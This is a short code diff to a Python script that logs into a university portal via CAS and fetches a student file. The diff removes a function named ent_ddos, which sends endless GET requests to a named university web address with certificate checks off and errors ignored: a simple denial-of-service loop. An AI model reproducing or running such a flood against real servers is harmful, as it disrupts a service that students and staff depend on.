@@ -39,17 +39,5 @@ def init_session(session: requests.Session, username: str, password: str) -> Non
     __cas_login(session)
 
 
-def ent_ddos(session: requests.Session):
-    url = 'https://ent2.utt.fr/uPortal/ExternalURLStats?fname=suivi-etudiants&service=https://cocktail-wo.utt.fr/cgi' \
-          '-bin/WebObjects/Dossier-Etudiants.woa/1/wa/casLogin'
-    while True:
-        try:
-            page = session.get(url, verify=False, data=payload)
-            print(f'{page.status_code} {page.reason}')
-        except:
-            print('error')
-            pass
-
-
 def get_student_file(session: requests.Session):
     return session.get(STUDENT_FILE_URL)
